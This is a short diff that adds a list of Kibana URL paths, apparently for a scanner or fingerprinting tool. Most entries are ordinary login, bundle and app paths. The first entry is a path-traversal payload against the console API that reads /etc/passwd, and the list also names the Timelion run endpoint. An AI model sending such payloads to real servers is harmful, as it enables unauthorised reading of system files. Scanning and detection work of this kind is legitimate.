@@ -1,0 +1,8 @@
+/api/console/api_server?sense_version=%40%40SENSE_VERSION&apis=../../../../../../../../../../../etc/passwd
+/api/timelion/run
+/login?next=%2F
+/bundles/login.bundle.js
+/bundles/kibana.style.css
+/login
+/app/kibana
+/app/kibana/
